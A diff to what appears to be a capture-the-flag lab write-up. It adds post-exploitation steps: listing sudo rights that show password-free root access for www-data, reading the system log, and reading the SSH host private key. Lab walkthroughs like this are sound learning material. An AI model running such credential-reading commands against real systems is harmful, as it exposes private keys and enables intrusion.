@@ -75,6 +75,29 @@ $ less '/home/rick/second ingredients' # 'more' and 'cat' disable
 
 ```
 
+
+
+```bash
+$ sudo -l
+
+Matching Defaults entries for www-data on ip-10-10-49-150:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on ip-10-10-49-150:
+    (ALL) NOPASSWD: ALL
+    
+$ sudo less /var/log/syslog
+...
+
+$ ls -la /etc/ssh
+...
+
+$ sudo less /etc/ssh/ssh_host_rsa_key
+...
+```
+
+
+
 _**Third ingredient**_:
 
 ```
